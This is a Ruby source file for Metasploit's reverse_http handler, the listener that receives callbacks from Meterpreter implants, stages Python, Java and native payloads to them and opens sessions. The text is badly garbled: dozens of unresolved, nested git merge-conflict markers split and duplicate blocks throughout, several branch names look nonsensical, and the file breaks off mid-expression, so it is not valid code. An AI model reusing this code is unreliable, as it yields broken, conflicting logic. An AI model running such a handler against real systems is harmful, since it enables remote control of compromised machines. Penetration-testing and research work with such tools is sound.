# -*- coding: binary -*-
require 'rex/io/stream_abstraction'
require 'rex/sync/ref'
require 'rex/payloads/meterpreter/uri_checksum'
require 'rex/post/meterpreter'
require 'rex/parser/x509_certificate'
require 'msf/core/payload/windows/verify_ssl'
require 'rex/user_agent'

module Msf
module Handler

###
#
# This handler implements the HTTP SSL tunneling interface.
#
###
module ReverseHttp

  include Msf::Handler
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
  include Msf::Handler::Reverse
=======
>>>>>>> origin/chore/MSP-12110/celluloid-supervision-tree
=======
>>>>>>> origin/msf-complex-payloads
=======
>>>>>>> origin/msf-complex-payloads
=======
>>>>>>> origin/payload-generator.rb
=======
>>>>>>> origin/pod/metasploit-serialized_class_loader
  include Rex::Payloads::Meterpreter::UriChecksum
  include Msf::Payload::Windows::VerifySsl

  #
  # Returns the string representation of the handler type
  #
  def self.handler_type
    return 'reverse_http'
  end

  #
  # Returns the connection-described general handler type, in this case
  # 'tunnel'.
  #
  def self.general_handler_type
    "tunnel"
  end

  #
  # Initializes the HTTP SSL tunneling handler.
  #
  def initialize(info = {})
    super

    register_options(
      [
        OptString.new('LHOST', [true, 'The local listener hostname']),
        OptPort.new('LPORT', [true, 'The local listener port', 8080])
      ], Msf::Handler::ReverseHttp)

    register_advanced_options(
      [
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD

        OptString.new('MeterpreterUserAgent', [false, 'The user-agent that the payload should use for communication', Rex::UserAgent.shortest]),
        OptString.new('MeterpreterServerName', [false, 'The server header that the handler will send in response to requests', 'Apache']),
        OptAddress.new('ReverseListenerBindAddress', [false, 'The specific IP address to bind to on the local system']),
=======
=======
>>>>>>> origin/chore/MSP-12110/celluloid-supervision-tree
=======
>>>>>>> origin/msf-complex-payloads
=======
>>>>>>> origin/msf-complex-payloads
=======
>>>>>>> origin/payload-generator.rb
=======
>>>>>>> origin/pod/metasploit-serialized_class_loader
        OptString.new('ReverseListenerComm', [false, 'The specific communication channel to use for this listener']),
        OptString.new('MeterpreterUserAgent', [false, 'The user-agent that the payload should use for communication', Rex::UserAgent.shortest]),
        OptString.new('MeterpreterServerName', [false, 'The server header that the handler will send in response to requests', 'Apache']),
        OptAddress.new('ReverseListenerBindAddress', [false, 'The specific IP address to bind to on the local system']),
        OptInt.new('ReverseListenerBindPort', [false, 'The port to bind to on the local system if different from LPORT']),
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
>>>>>>> origin/4.11.2_release_pre-rails4
=======
>>>>>>> origin/chore/MSP-12110/celluloid-supervision-tree
=======
>>>>>>> origin/msf-complex-payloads
=======
>>>>>>> origin/msf-complex-payloads
=======
>>>>>>> origin/payload-generator.rb
=======
>>>>>>> origin/pod/metasploit-serialized_class_loader
        OptBool.new('OverrideRequestHost', [false, 'Forces a specific host and port instead of using what the client requests, defaults to LHOST:LPORT', false]),
        OptString.new('OverrideLHOST', [false, 'When OverrideRequestHost is set, use this value as the host name for secondary requests']),
        OptPort.new('OverrideLPORT', [false, 'When OverrideRequestHost is set, use this value as the port number for secondary requests']),
        OptString.new('HttpUnknownRequestResponse', [false, 'The returned HTML response body when the handler receives a request that is not from a payload', '<html><body><h1>It works!</h1></body></html>']),
        OptBool.new('IgnoreUnknownPayloads', [false, 'Whether to drop connections from payloads using unknown UUIDs', false])
      ], Msf::Handler::ReverseHttp)
  end

  # Determine where to bind the server
  #
  # @return [String]
  def listener_address
    if datastore['ReverseListenerBindAddress'].to_s == ''
      bindaddr = Rex::Socket.is_ipv6?(datastore['LHOST']) ? '::' : '0.0.0.0'
    else
      bindaddr = datastore['ReverseListenerBindAddress']
    end

    bindaddr
  end

  # Return a URI suitable for placing in a payload
  #
  # @return [String] A URI of the form +scheme://host:port/+
  def listener_uri
    uri_host = Rex::Socket.is_ipv6?(listener_address) ? "[#{listener_address}]" : listener_address
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
    "#{scheme}://#{uri_host}:#{bind_port}/"
=======
    "#{scheme}://#{uri_host}:#{datastore['LPORT']}/"
<<<<<<< HEAD
>>>>>>> origin/chore/MSP-12110/celluloid-supervision-tree
=======
    "#{scheme}://#{uri_host}:#{datastore['LPORT']}/"
>>>>>>> origin/msf-complex-payloads
=======
    "#{scheme}://#{uri_host}:#{datastore['LPORT']}/"
>>>>>>> origin/msf-complex-payloads
=======
    "#{scheme}://#{uri_host}:#{datastore['LPORT']}/"
>>>>>>> origin/payload-generator.rb
=======
=======
    "#{scheme}://#{uri_host}:#{bind_port}/"
=======
    "#{scheme}://#{uri_host}:#{datastore['LPORT']}/"
>>>>>>> origin/pod/metasploit-excellent.mp3
=======
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
    "#{scheme}://#{uri_host}:#{bind_port}/"
=======
    "#{scheme}://#{uri_host}:#{datastore['LPORT']}/"
>>>>>>> origin/pod/metasploit-framework
>>>>>>> chore/MSP-12110/celluloid-supervision-tree
=======
    "#{scheme}://#{uri_host}:#{datastore['LPORT']}/"
>>>>>>> chore/MSP-12110/celluloid-supervision-tree
=======
    "#{scheme}://#{uri_host}:#{datastore['LPORT']}/"
>>>>>>> chore/MSP-12110/celluloid-supervision-tree
<<<<<<< HEAD
<<<<<<< HEAD
=======
    "#{scheme}://#{uri_host}:#{datastore['LPORT']}/"
>>>>>>> msf-complex-payloads
>>>>>>> origin/pod/metasploit-api/_index.html
=======
>>>>>>> origin/pod/metasploit-excellent.mp3
=======
=======
    "#{scheme}://#{uri_host}:#{datastore['LPORT']}/"
>>>>>>> msf-complex-payloads
=======
    "#{scheme}://#{uri_host}:#{datastore['LPORT']}/"
>>>>>>> msf-complex-payloads
=======
    "#{scheme}://#{uri_host}:#{datastore['LPORT']}/"
>>>>>>> payload-generator.rb
=======
    "#{scheme}://#{uri_host}:#{datastore['LPORT']}/"
>>>>>>> pod/metasploit-gemfile-
=======
    "#{scheme}://#{uri_host}:#{datastore['LPORT']}/"
>>>>>>> chore/MSP-12110/celluloid-supervision-tree
=======
    "#{scheme}://#{uri_host}:#{datastore['LPORT']}/"
>>>>>>> chore/MSP-12110/celluloid-supervision-tree
=======
    "#{scheme}://#{uri_host}:#{datastore['LPORT']}/"
>>>>>>> chore/MSP-12110/celluloid-supervision-tree
>>>>>>> origin/pod/metasploit-framework
=======
    "#{scheme}://#{uri_host}:#{datastore['LPORT']}/"
=======
    "#{scheme}://#{uri_host}:#{bind_port}/"
>>>>>>> rapid7/master
>>>>>>> origin/pod/metasploit-serialized_class_loader
  end

  # Return a URI suitable for placing in a payload.
  #
  # Host will be properly wrapped in square brackets, +[]+, for ipv6
  # addresses.
  #
  # @return [String] A URI of the form +scheme://host:port/+
  def payload_uri(req)
    callback_host = nil

    # Extract whatever the client sent us in the Host header
    if req && req.headers && req.headers['Host']
      callback_host = req.headers['Host']
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
=======
>>>>>>> origin/msf-complex-payloads
    end

    # Override the host and port as appropriate
    if datastore['OverrideRequestHost'] || callback_host.nil?
      callback_name = datastore['OverrideLHOST'] || datastore['LHOST']
      callback_port = datastore['OverrideLPORT'] || datastore['LPORT']
      if Rex::Socket.is_ipv6? callback_name
        callback_name = "[#{callback_name}]"
      end
      callback_host = "#{callback_name}:#{callback_port}"
    end

<<<<<<< HEAD
=======
    end

=======
    end

>>>>>>> origin/payload-generator.rb
=======
    end

>>>>>>> origin/pod/metasploit-serialized_class_loader
    # Override the host and port as appropriate
    if datastore['OverrideRequestHost'] || callback_host.nil?
      callback_name = datastore['OverrideLHOST'] || datastore['LHOST']
      callback_port = datastore['OverrideLPORT'] || datastore['LPORT']
      if Rex::Socket.is_ipv6? callback_name
        callback_name = "[#{callback_name}]"
      end
      callback_host = "#{callback_name}:#{callback_port}"
    end

<<<<<<< HEAD
<<<<<<< HEAD
>>>>>>> origin/msf-complex-payloads
=======
>>>>>>> origin/msf-complex-payloads
=======
>>>>>>> origin/payload-generator.rb
=======
>>>>>>> origin/pod/metasploit-serialized_class_loader
    "#{scheme}://#{callback_host}/"
  end

  # Use the {#refname} to determine whether this handler uses SSL or not
  #
  def ssl?
    !!(self.refname.index('https'))
  end

  # URI scheme
  #
  # @return [String] One of "http" or "https" depending on whether we
  #   are using SSL
  def scheme
    (ssl?) ? 'https' : 'http'
  end

  # Create an HTTP listener
  #
  def setup_handler

<<<<<<< HEAD
=======
    comm = datastore['ReverseListenerComm']
    if (comm.to_s == 'local')
      comm = ::Rex::Socket::Comm::Local
    else
      comm = nil
    end

>>>>>>> origin/4.11.2_release_pre-rails4
    local_port = bind_port

    # Start the HTTPS server service on this host/port
    self.service = Rex::ServiceManager.start(Rex::Proto::Http::Server,
      local_port,
      listener_address,
      ssl?,
      {
        'Msf'        => framework,
        'MsfExploit' => self,
      },
<<<<<<< HEAD
      nil,
=======
      comm,
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
>>>>>>> origin/4.11.2_release_pre-rails4
=======
>>>>>>> origin/chore/MSP-12110/celluloid-supervision-tree
=======
>>>>>>> origin/msf-complex-payloads
=======
>>>>>>> origin/msf-complex-payloads
=======
>>>>>>> origin/payload-generator.rb
=======
>>>>>>> origin/pod/metasploit-serialized_class_loader
      (ssl?) ? datastore['HandlerSSLCert'] : nil
    )

    self.service.server_name = datastore['MeterpreterServerName']

    # Create a reference to ourselves
    obj = self

    # Add the new resource
    service.add_resource("/",
      'Proc' => Proc.new { |cli, req|
        on_request(cli, req, obj)
      },
      'VirtualDirectory' => true)

    print_status("Started #{scheme.upcase} reverse handler on #{listener_uri}")
    lookup_proxy_settings

    if datastore['IgnoreUnknownPayloads']
      print_status("Handler is ignoring unknown payloads, there are #{framework.uuid_db.keys.length} UUIDs whitelisted")
    end
  end

  #
  # Removes the / handler, possibly stopping the service if no sessions are
  # active on sub-urls.
  #
  def stop_handler
    if self.service
      self.service.remove_resource('/')
      if self.service.resources.empty? && self.sessions == 0
        Rex::ServiceManager.stop_service(self.service)
      end
    end
  end

  attr_accessor :service # :nodoc:

protected

  #
  # Parses the proxy settings and returns a hash
  #
  def lookup_proxy_settings
    info = {}
    return @proxy_settings if @proxy_settings

    if datastore['PayloadProxyHost'].to_s == ''
      @proxy_settings = info
      return @proxy_settings
    end

    info[:host] = datastore['PayloadProxyHost'].to_s
    info[:port] = (datastore['PayloadProxyPort'] || 8080).to_i
    info[:type] = datastore['PayloadProxyType'].to_s

    uri_host = info[:host]

    if Rex::Socket.is_ipv6?(uri_host)
      uri_host = "[#{info[:host]}]"
    end

    info[:info] = "#{uri_host}:#{info[:port]}"

    if info[:type] == "SOCKS"
      info[:info] = "socks=#{info[:info]}"
    else
      info[:info] = "http://#{info[:info]}"
      if datastore['PayloadProxyUser'].to_s != ''
        info[:username] = datastore['PayloadProxyUser'].to_s
      end
      if datastore['PayloadProxyPass'].to_s != ''
        info[:password] = datastore['PayloadProxyPass'].to_s
      end
    end

    @proxy_settings = info
  end

  #
  # Parses the HTTPS request
  #
  def on_request(cli, req, obj)
    resp = Rex::Proto::Http::Response.new
    info = process_uri_resource(req.relative_resource)
    uuid = info[:uuid] || Msf::Payload::UUID.new
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
=======
>>>>>>> origin/msf-complex-payloads
=======
>>>>>>> origin/msf-complex-payloads
=======
>>>>>>> origin/payload-generator.rb
=======
>>>>>>> origin/pod/metasploit-serialized_class_loader

    # Configure the UUID architecture and payload if necessary
    uuid.arch      ||= obj.arch
    uuid.platform  ||= obj.platform
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
=======
>>>>>>> origin/pod/metasploit-serialized_class_loader

    conn_id = nil
    if info[:mode] && info[:mode] != :connect
      conn_id = generate_uri_uuid(URI_CHECKSUM_CONN, uuid)
    end

    request_summary = "#{req.relative_resource} with UA '#{req.headers['User-Agent']}'"
<<<<<<< HEAD

    # Validate known UUIDs for all requests if IgnoreUnknownPayloads is set
    if datastore['IgnoreUnknownPayloads'] && ! framework.uuid_db[uuid.puid_hex]
      print_status("#{cli.peerhost}:#{cli.peerport} (UUID: #{uuid.to_s}) Ignoring unknown UUID: #{request_summary}")
      info[:mode] = :unknown_uuid
    end

=======

    # Validate known UUIDs for all requests if IgnoreUnknownPayloads is set
    if datastore['IgnoreUnknownPayloads'] && ! framework.uuid_db[uuid.puid_hex]
      print_status("#{cli.peerhost}:#{cli.peerport} (UUID: #{uuid.to_s}) Ignoring unknown UUID: #{request_summary}")
      info[:mode] = :unknown_uuid
    end

>>>>>>> origin/pod/metasploit-serialized_class_loader
    # Validate known URLs for all session init requests if IgnoreUnknownPayloads is set
    if datastore['IgnoreUnknownPayloads'] && info[:mode].to_s =~ /^init_/
      allowed_urls = framework.uuid_db[uuid.puid_hex]['urls'] || []
      unless allowed_urls.include?(req.relative_resource)
        print_status("#{cli.peerhost}:#{cli.peerport} (UUID: #{uuid.to_s}) Ignoring unknown UUID URL: #{request_summary}")
        info[:mode] = :unknown_uuid_url
      end
    end
<<<<<<< HEAD

=======

    # Configure the UUID architecture and payload if necessary
    uuid.arch      ||= obj.arch
    uuid.platform  ||= obj.platform

    conn_id = nil
    if info[:mode] && info[:mode] != :connect
      conn_id = generate_uri_uuid(URI_CHECKSUM_CONN, uuid)
    end

    request_summary = "#{req.relative_resource} with UA '#{req.headers['User-Agent']}'"

    # Validate known UUIDs for all requests if IgnoreUnknownPayloads is set
    if datastore['IgnoreUnknownPayloads'] && ! framework.uuid_db[uuid.puid_hex]
      print_status("#{cli.peerhost}:#{cli.peerport} (UUID: #{uuid.to_s}) Ignoring unknown UUID: #{request_summary}")
      info[:mode] = :unknown_uuid
    end

    # Validate known URLs for all session init requests if IgnoreUnknownPayloads is set
    if datastore['IgnoreUnknownPayloads'] && info[:mode].to_s =~ /^init_/
      allowed_urls = framework.uuid_db[uuid.puid_hex]['urls'] || []
      unless allowed_urls.include?(req.relative_resource)
        print_status("#{cli.peerhost}:#{cli.peerport} (UUID: #{uuid.to_s}) Ignoring unknown UUID URL: #{request_summary}")
        info[:mode] = :unknown_uuid_url
      end
    end

>>>>>>> origin/chore/MSP-12110/celluloid-supervision-tree
=======

=======

>>>>>>> origin/msf-complex-payloads
    conn_id = nil
    if info[:mode] && info[:mode] != :connect
      conn_id = generate_uri_uuid(URI_CHECKSUM_CONN, uuid)
    end

=======

    conn_id = nil
    if info[:mode] && info[:mode] != :connect
      conn_id = generate_uri_uuid(URI_CHECKSUM_CONN, uuid)
    end

>>>>>>> origin/payload-generator.rb
    request_summary = "#{req.relative_resource} with UA '#{req.headers['User-Agent']}'"

    # Validate known UUIDs for all requests if IgnoreUnknownPayloads is set
    if datastore['IgnoreUnknownPayloads'] && ! framework.uuid_db[uuid.puid_hex]
      print_status("#{cli.peerhost}:#{cli.peerport} (UUID: #{uuid.to_s}) Ignoring unknown UUID: #{request_summary}")
      info[:mode] = :unknown_uuid
    end

    # Validate known URLs for all session init requests if IgnoreUnknownPayloads is set
    if datastore['IgnoreUnknownPayloads'] && info[:mode].to_s =~ /^init_/
      allowed_urls = framework.uuid_db[uuid.puid_hex]['urls'] || []
      unless allowed_urls.include?(req.relative_resource)
        print_status("#{cli.peerhost}:#{cli.peerport} (UUID: #{uuid.to_s}) Ignoring unknown UUID URL: #{request_summary}")
        info[:mode] = :unknown_uuid_url
      end
    end

<<<<<<< HEAD
<<<<<<< HEAD
>>>>>>> origin/msf-complex-payloads
=======
>>>>>>> origin/msf-complex-payloads
=======
>>>>>>> origin/payload-generator.rb
=======

>>>>>>> origin/pod/metasploit-serialized_class_loader
    self.pending_connections += 1

    # Process the requested resource.
    case info[:mode]
      when :init_connect
        print_status("#{cli.peerhost}:#{cli.peerport} (UUID: #{uuid.to_s}) Redirecting stageless connection from #{request_summary}")
<<<<<<< HEAD

        # Handle the case where stageless payloads call in on the same URI when they
        # first connect. From there, we tell them to callback on a connect URI that
        # was generated on the fly. This means we form a new session for each.

        # Hurl a TLV back at the caller, and ignore the response
        pkt = Rex::Post::Meterpreter::Packet.new(Rex::Post::Meterpreter::PACKET_TYPE_RESPONSE,
                                                 'core_patch_url')
        pkt.add_tlv(Rex::Post::Meterpreter::TLV_TYPE_TRANS_URL, conn_id + "/")
        resp.body = pkt.to_r

      when :init_python
        print_status("#{cli.peerhost}:#{cli.peerport} (UUID: #{uuid.to_s}) Staging Python payload ...")
        url = payload_uri(req) + conn_id + '/'

        blob = ""
        blob << obj.generate_stage(
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
=======
<<<<<<< HEAD
>>>>>>> origin/pod/metasploit-api/_index.html
=======
>>>>>>> origin/pod/metasploit-excellent.mp3
=======
=======
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
>>>>>>> pod/metasploit-inject.vcxproj.filters-master_0
>>>>>>> origin/pod/metasploit-framework
          http_url: url,
          http_user_agent: datastore['MeterpreterUserAgent'],
          http_proxy_host: datastore['PayloadProxyHost'] || datastore['PROXYHOST'],
          http_proxy_port: datastore['PayloadProxyPort'] || datastore['PROXYPORT'],
          uuid: uuid,
          uri:  conn_id
        )
=======
<<<<<<< HEAD
=======
<<<<<<< HEAD
<<<<<<< HEAD
>>>>>>> origin/chore/MSP-12110/celluloid-supervision-tree
=======
>>>>>>> origin/msf-complex-payloads
=======
>>>>>>> origin/msf-complex-payloads
=======
>>>>>>> origin/payload-generator.rb
=======
=======
>>>>>>> origin/pod/metasploit-excellent.mp3
=======
<<<<<<< HEAD
=======
=======
>>>>>>> origin/pod/metasploit-framework
>>>>>>> chore/MSP-12110/celluloid-supervision-tree
=======
>>>>>>> chore/MSP-12110/celluloid-supervision-tree
=======
>>>>>>> chore/MSP-12110/celluloid-supervision-tree
=======
>>>>>>> 4.11.2_release_pre-rails4
<<<<<<< HEAD
<<<<<<< HEAD
=======
>>>>>>> msf-complex-payloads
>>>>>>> origin/pod/metasploit-api/_index.html
=======
>>>>>>> origin/pod/metasploit-excellent.mp3
=======
=======
>>>>>>> msf-complex-payloads
=======
>>>>>>> msf-complex-payloads
=======
>>>>>>> payload-generator.rb
=======
>>>>>>> pod/metasploit-gemfile-
>>>>>>> pod/metasploit-inject.vcxproj.filters-master_0
=======
>>>>>>> chore/MSP-12110/celluloid-supervision-tree
=======
>>>>>>> chore/MSP-12110/celluloid-supervision-tree
=======
>>>>>>> chore/MSP-12110/celluloid-supervision-tree
>>>>>>> origin/pod/metasploit-framework
          uuid: uuid,
          uri:  conn_id
        )
=======
<<<<<<< HEAD

        # Handle the case where stageless payloads call in on the same URI when they
        # first connect. From there, we tell them to callback on a connect URI that
        # was generated on the fly. This means we form a new session for each.
>>>>>>> origin/pod/metasploit-serialized_class_loader

        # Hurl a TLV back at the caller, and ignore the response
        pkt = Rex::Post::Meterpreter::Packet.new(Rex::Post::Meterpreter::PACKET_TYPE_RESPONSE,
                                                 'core_patch_url')
        pkt.add_tlv(Rex::Post::Meterpreter::TLV_TYPE_TRANS_URL, conn_id + "/")
        resp.body = pkt.to_r

      when :init_python
        print_status("#{cli.peerhost}:#{cli.peerport} (UUID: #{uuid.to_s}) Staging Python payload ...")
        url = payload_uri(req) + conn_id + '/'

        blob = ""
        blob << obj.generate_stage(
          uuid: uuid,
          uri:  conn_id
        )
=======

        # Handle the case where stageless payloads call in on the same URI when they
        # first connect. From there, we tell them to callback on a connect URI that
        # was generated on the fly. This means we form a new session for each.
>>>>>>> rapid7/master

        # Hurl a TLV back at the caller, and ignore the response
        pkt = Rex::Post::Meterpreter::Packet.new(Rex::Post::Meterpreter::PACKET_TYPE_RESPONSE,
                                                 'core_patch_url')
        pkt.add_tlv(Rex::Post::Meterpreter::TLV_TYPE_TRANS_URL, conn_id + "/")
        resp.body = pkt.to_r

<<<<<<< HEAD
        # Patch all the things
        blob.sub!('HTTP_CONNECTION_URL = None', "HTTP_CONNECTION_URL = '#{var_escape.call(url)}'")
        blob.sub!('HTTP_USER_AGENT = None', "HTTP_USER_AGENT = '#{var_escape.call(datastore['MeterpreterUserAgent'])}'")

        unless datastore['PayloadProxyHost'].blank?
          proxy_url = "http://#{datastore['PayloadProxyHost']||datastore['PROXYHOST']}:#{datastore['PayloadProxyPort']||datastore['PROXYPORT']}"
          blob.sub!('HTTP_PROXY = None', "HTTP_PROXY = '#{var_escape.call(proxy_url)}'")
        end
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
>>>>>>> origin/4.11.2_release_pre-rails4
=======
>>>>>>> 4.11.2_release_pre-rails4
>>>>>>> origin/pod/metasploit-api/_index.html
=======
>>>>>>> 4.11.2_release_pre-rails4
>>>>>>> origin/pod/metasploit-excellent.mp3
=======
>>>>>>> 4.11.2_release_pre-rails4
>>>>>>> origin/pod/metasploit-framework
=======
=======
      when :init_python
        print_status("#{cli.peerhost}:#{cli.peerport} (UUID: #{uuid.to_s}) Staging Python payload ...")
        url = payload_uri(req) + conn_id + '/'

        blob = ""
        blob << obj.generate_stage(
          http_url: url,
          http_user_agent: datastore['MeterpreterUserAgent'],
          http_proxy_host: datastore['PayloadProxyHost'] || datastore['PROXYHOST'],
          http_proxy_port: datastore['PayloadProxyPort'] || datastore['PROXYPORT'],
          uuid: uuid,
          uri:  conn_id
        )
>>>>>>> rapid7/master
>>>>>>> origin/pod/metasploit-serialized_class_loader

        resp.body = blob

        # Short-circuit the payload's handle_connection processing for create_session
        create_session(cli, {
          :passive_dispatcher => obj.service,
          :conn_id            => conn_id,
          :url                => url,
          :expiration         => datastore['SessionExpirationTimeout'].to_i,
          :comm_timeout       => datastore['SessionCommunicationTimeout'].to_i,
          :retry_total        => datastore['SessionRetryTotal'].to_i,
          :retry_wait         => datastore['SessionRetryWait'].to_i,
          :ssl                => ssl?,
          :payload_uuid       => uuid
        })
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD

      when :init_java
        print_status("#{cli.peerhost}:#{cli.peerport} (UUID: #{uuid.to_s}) Staging Java payload ...")
        url = payload_uri(req) + conn_id + "/\x00"

=======

=======

>>>>>>> origin/payload-generator.rb
=======

>>>>>>> origin/pod/metasploit-serialized_class_loader
      when :init_java
        print_status("#{cli.peerhost}:#{cli.peerport} (UUID: #{uuid.to_s}) Staging Java payload ...")
        url = payload_uri(req) + conn_id + "/\x00"

<<<<<<< HEAD
<<<<<<< HEAD
>>>>>>> origin/msf-complex-payloads
=======
>>>>>>> origin/payload-generator.rb
=======
>>>>>>> origin/pod/metasploit-serialized_class_loader
        blob = obj.generate_stage(
          uuid: uuid,
          uri:  conn_id
        )

        resp.body = blob

        # Short-circuit the payload's handle_connection processing for create_session
        create_session(cli, {
          :passive_dispatcher => obj.service,
          :conn_id            => conn_id,
          :url                => url,
          :expiration         => datastore['SessionExpirationTimeout'].to_i,
          :comm_timeout       => datastore['SessionCommunicationTimeout'].to_i,
          :retry_total        => datastore['SessionRetryTotal'].to_i,
          :retry_wait         => datastore['SessionRetryWait'].to_i,
          :ssl                => ssl?,
          :payload_uuid       => uuid
        })

      when :init_native
        print_status("#{cli.peerhost}:#{cli.peerport} (UUID: #{uuid.to_s}) Staging Native payload ...")
        url = payload_uri(req) + conn_id + "/\x00"
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
        uri = URI(payload_uri(req) + conn_id)
=======
<<<<<<< HEAD
>>>>>>> origin/chore/MSP-12110/celluloid-supervision-tree
=======
>>>>>>> origin/msf-complex-payloads
=======
>>>>>>> origin/msf-complex-payloads
=======
>>>>>>> origin/payload-generator.rb
=======
=======
        uri = URI(payload_uri(req) + conn_id)
=======
>>>>>>> origin/pod/metasploit-excellent.mp3
>>>>>>> chore/MSP-12110/celluloid-supervision-tree
=======
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
        uri = URI(payload_uri(req) + conn_id)
=======
>>>>>>> chore/MSP-12110/celluloid-supervision-tree
=======
>>>>>>> chore/MSP-12110/celluloid-supervision-tree
=======
>>>>>>> chore/MSP-12110/celluloid-supervision-tree
=======
>>>>>>> msf-complex-payloads
=======
>>>>>>> msf-complex-payloads
=======
>>>>>>> payload-generator.rb
=======
>>>>>>> pod/metasploit-gemfile-
>>>>>>> origin/pod/metasploit-framework
=======
>>>>>>> chore/MSP-12110/celluloid-supervision-tree
=======
>>>>>>> chore/MSP-12110/celluloid-supervision-tree
<<<<<<< HEAD
<<<<<<< HEAD
=======
>>>>>>> msf-complex-payloads
>>>>>>> origin/pod/metasploit-api/_index.html
=======
>>>>>>> origin/pod/metasploit-excellent.mp3
=======
=======
>>>>>>> chore/MSP-12110/celluloid-supervision-tree
>>>>>>> origin/pod/metasploit-framework
=======
=======
        uri = URI(payload_uri(req) + conn_id)
>>>>>>> rapid7/master
>>>>>>> origin/pod/metasploit-serialized_class_loader

        resp['Content-Type'] = 'application/octet-stream'

        # generate the stage, but pass in the existing UUID and connection id so that
        # we don't get new ones generated.
        blob = obj.stage_payload(
          uuid: uuid,
          uri:  conn_id,
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
=======
<<<<<<< HEAD
>>>>>>> origin/pod/metasploit-api/_index.html
=======
>>>>>>> origin/pod/metasploit-excellent.mp3
=======
=======
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
>>>>>>> pod/metasploit-inject.vcxproj.filters-master_0
>>>>>>> origin/pod/metasploit-framework
          lhost: uri.host,
          lport: uri.port
=======
          lhost: datastore['OverrideRequestHost'] ? datastore['OverrideLHOST'] : (req && req.headers && req.headers['Host']) ? req.headers['Host'] : datastore['LHOST'],
          lport: datastore['OverrideRequestHost'] ? datastore['OverrideLPORT'] : datastore['LPORT']
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
>>>>>>> origin/4.11.2_release_pre-rails4
=======
          lhost: datastore['OverrideRequestHost'] ? datastore['OverrideLHOST'] : (req && req.headers && req.headers['Host']) ? req.headers['Host'] : datastore['LHOST'],
          lport: datastore['OverrideRequestHost'] ? datastore['OverrideLPORT'] : datastore['LPORT']
>>>>>>> origin/chore/MSP-12110/celluloid-supervision-tree
=======
          lhost: datastore['OverrideRequestHost'] ? datastore['OverrideLHOST'] : (req && req.headers && req.headers['Host']) ? req.headers['Host'] : datastore['LHOST'],
          lport: datastore['OverrideRequestHost'] ? datastore['OverrideLPORT'] : datastore['LPORT']
>>>>>>> origin/msf-complex-payloads
=======
          lhost: datastore['OverrideRequestHost'] ? datastore['OverrideLHOST'] : (req && req.headers && req.headers['Host']) ? req.headers['Host'] : datastore['LHOST'],
          lport: datastore['OverrideRequestHost'] ? datastore['OverrideLPORT'] : datastore['LPORT']
>>>>>>> origin/msf-complex-payloads
=======
          lhost: datastore['OverrideRequestHost'] ? datastore['OverrideLHOST'] : (req && req.headers && req.headers['Host']) ? req.headers['Host'] : datastore['LHOST'],
          lport: datastore['OverrideRequestHost'] ? datastore['OverrideLPORT'] : datastore['LPORT']
>>>>>>> origin/payload-generator.rb
=======
=======
>>>>>>> origin/pod/metasploit-excellent.mp3
>>>>>>> 4.11.2_release_pre-rails4
=======
          lhost: datastore['OverrideRequestHost'] ? datastore['OverrideLHOST'] : (req && req.headers && req.headers['Host']) ? req.headers['Host'] : datastore['LHOST'],
          lport: datastore['OverrideRequestHost'] ? datastore['OverrideLPORT'] : datastore['LPORT']
>>>>>>> chore/MSP-12110/celluloid-supervision-tree
=======
          lhost: datastore['OverrideRequestHost'] ? datastore['OverrideLHOST'] : (req && req.headers && req.headers['Host']) ? req.headers['Host'] : datastore['LHOST'],
          lport: datastore['OverrideRequestHost'] ? datastore['OverrideLPORT'] : datastore['LPORT']
>>>>>>> chore/MSP-12110/celluloid-supervision-tree
=======
>>>>>>> 4.11.2_release_pre-rails4
<<<<<<< HEAD
=======
=======
          lhost: datastore['OverrideRequestHost'] ? datastore['OverrideLHOST'] : (req && req.headers && req.headers['Host']) ? req.headers['Host'] : datastore['LHOST'],
          lport: datastore['OverrideRequestHost'] ? datastore['OverrideLPORT'] : datastore['LPORT']
>>>>>>> chore/MSP-12110/celluloid-supervision-tree
=======
          lhost: datastore['OverrideRequestHost'] ? datastore['OverrideLHOST'] : (req && req.headers && req.headers['Host']) ? req.headers['Host'] : datastore['LHOST'],
          lport: datastore['OverrideRequestHost'] ? datastore['OverrideLPORT'] : datastore['LPORT']
>>>>>>> chore/MSP-12110/celluloid-supervision-tree
=======
          lhost: datastore['OverrideRequestHost'] ? datastore['OverrideLHOST'] : (req && req.headers && req.headers['Host']) ? req.headers['Host'] : datastore['LHOST'],
